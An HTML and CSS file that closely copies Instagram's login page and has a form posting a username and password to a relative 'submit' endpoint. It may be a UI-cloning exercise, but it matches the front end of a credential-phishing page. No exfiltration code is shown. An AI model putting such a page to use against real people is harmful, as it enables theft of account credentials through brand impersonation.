<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        /* Reset and base styles */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
}

body {
    background-color: #fafafa;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 20px;
}

.container {
    max-width: 350px;
    width: 100%;
}

/* Login box styles */
.login-box {
    background-color: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 1px;
    padding: 20px 40px;
    margin-bottom: 10px;
    text-align: center;
}

.logo {
    margin: 22px auto 12px;
}

.logo img {
    width: 175px;
}

.login-form input {
    width: 100%;
    padding: 9px 8px 7px;
    margin-bottom: 6px;
    background: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    font-size: 12px;
}

.login-form input:focus {
    border: 1px solid #a8a8a8;
    outline: none;
}

.login-button {
    width: 100%;
    background-color: #0095f6;
    color: white;
    border: none;
    border-radius: 4px;
    padding: 7px 16px;
    font-weight: 600;
    margin: 8px 0;
    cursor: pointer;
}

.login-button:disabled {
    background-color: rgba(0, 149, 246, 0.3);
    cursor: default;
}

.divider {
    display: flex;
    align-items: center;
    margin: 10px 0 18px;
    color: #8e8e8e;
    font-size: 13px;
    font-weight: 600;
}

.divider::before, .divider::after {
    content: "";
    flex: 1;
    border-bottom: 1px solid #dbdbdb;
}

.divider::before {
    margin-right: 10px;
}

.divider::after {
    margin-left: 10px;
}

.fb-login {
    display: flex;
    justify-content: center;
    align-items: center;
    color: #385185;
    font-size: 14px;
    font-weight: 600;
    text-decoration: none;
    margin-bottom: 20px;
}

.fb-login img {
    width: 16px;
    margin-right: 8px;
}

.forgot-password {
    color: #00376b;
    font-size: 12px;
    text-decoration: none;
}

/* Sign up box */
.signup-box {
    background-color: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 1px;
    padding: 20px;
    text-align: center;
    margin-bottom: 20px;
    font-size: 14px;
}

.signup-box a {
    color: #0095f6;
    font-weight: 600;
    text-decoration: none;
}

/* App download */
.app-download {
    text-align: center;
    font-size: 14px;
    margin-bottom: 20px;
}

.app-buttons {
    display: flex;
    justify-content: center;
    margin-top: 20px;
}

.app-buttons a {
    margin: 0 4px;
}

.app-buttons img {
    height: 40px;
}

/* Responsive styles */
@media (max-width: 450px) {
    body {
        background-color: #fff;
        padding: 0;
    }
    
    .container {
        max-width: 100%;
    }
    
    .login-box, .signup-box {
        border: none;
        background-color: transparent;
    }
    
    .signup-box {
        margin-top: 0;
    }
}
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
               <img src="logo.png" alt="Instagram">
            </div>
            <form class="login-form" action="submit" method="post">
                <input name="username" type="text" placeholder="Phone number, username, or email" required>
                <input name="password" type="password" placeholder="Password" required>
                <button type="submit" class="login-button">Log In</button>
                <div class="divider">
                    <span>OR</span>
                </div>
                <a href="facebook.com" class="fb-login">
                    <img src="facebook_icon.png" alt="Facebook">
                    <span>Log in with Facebook</span>
                </a>
                <a href="resetpassword.com" class="forgot-password">Forgot password?</a>
            </form>
        </div>
        <div class="signup-box">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
        <div class="app-download">
            <p>Get the app.</p>
            <div class="app-buttons">
                <a href="apple.com"><img src="app_store.png" alt="App Store"></a>
                <a href="play.google.com"><img src="google_play.png" alt="Google Play"></a>
            </div>
        </div>
    </div>
</body>
</html>
